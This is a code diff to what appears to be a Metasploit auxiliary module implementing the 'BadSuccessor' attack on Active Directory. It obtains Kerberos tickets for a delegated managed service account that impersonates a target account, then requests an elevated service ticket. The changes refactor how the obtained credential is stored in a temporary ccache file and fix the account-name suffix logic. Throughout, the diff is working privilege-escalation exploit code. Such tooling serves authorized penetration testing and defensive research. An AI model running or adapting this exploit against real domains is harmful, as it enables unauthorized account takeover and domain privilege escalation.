@@ -287,14 +287,15 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    ticket = mod.run_simple(
+    result = mod.run_simple(
       'LocalInput' => user_input,
       'LocalOutput' => user_output
     )
 
-    # Exceptions raised in the get_ticket won't propagate here, so fail if the ticket is nil
-    fail_with(Failure::Unknown, 'Failed to run get_ticket module') unless ticket
-    ticket
+    # Exceptions raised in the get_ticket won't propagate here, so fail if the credential is nil
+    fail_with(Failure::Unknown, 'Failed to run get_ticket module.') unless result
+
+    result[:credential]
   end
 
   def action_get_ticket
@@ -313,7 +314,8 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Obtained TGT for the user #{datastore['LDAPUsername']}")
 
     # Secondly get a TGT for dMSA impersonating the target account:
-    impersonate = datastore['DMSA_ACCOUNT_NAME'] + '$' unless datastore['DMSA_ACCOUNT_NAME'].ends_with?('$')
+    impersonate = datastore['DMSA_ACCOUNT_NAME']
+    impersonate += '$' unless impersonate.ends_with?('$')
     get_dmsa_tgs_options = {
       'DOMAIN' => datastore['LDAPDomain'],
       'PASSWORD' => datastore['LDAPPassword'],
@@ -326,21 +328,30 @@ class MetasploitModule < Msf::Auxiliary
       'krb5ccname' => user_tgt[:path]
     }
 
-    dmsa_tgs = run_get_ticket_module(get_ticket_module, get_dmsa_tgs_options)
+    dmsa_credential = run_get_ticket_module(get_ticket_module, get_dmsa_tgs_options)
     print_good("Obtained TGT for dMSA #{datastore['DMSA_ACCOUNT_NAME']}")
 
-    # Lastly request the ticket for the desired service:
-    get_priv_esc_tgs_options = {
-      'username' => impersonate,
-      'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}.#{datastore['LDAPDomain']}",
-      'action' => 'get_tgs',
-      'krb5ccname' => dmsa_tgs[:path],
-      'PASSWORD' => :unset,
-      'IMPERSONATE' => :unset,
-      'IMPERSONATE_TYPE' => 'none'
-    }
+    temp_ccache_file = Tempfile.create(['bad_successor_', '.ccache'], binmode: true)
+    begin
+      temp_ccache_file.write(dmsa_credential.to_ccache.encode)
+      temp_ccache_file.close
 
-    run_get_ticket_module(get_ticket_module, get_priv_esc_tgs_options)
+      # Lastly request the ticket for the desired service:
+      get_priv_esc_tgs_options = {
+        'username' => impersonate,
+        'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}.#{datastore['LDAPDomain']}",
+        'action' => 'get_tgs',
+        'krb5ccname' => temp_ccache_file.path,
+        'PASSWORD' => :unset,
+        'IMPERSONATE' => :unset,
+        'IMPERSONATE_TYPE' => 'none'
+      }
+
+      run_get_ticket_module(get_ticket_module, get_priv_esc_tgs_options)
+    ensure
+      File.unlink(temp_ccache_file.path) if temp_ccache_file && File.exist?(temp_ccache_file.path)
+    end
+
     print_good("Obtained elevated TGT for #{datastore['DMSA_ACCOUNT_NAME']}")
   end
 
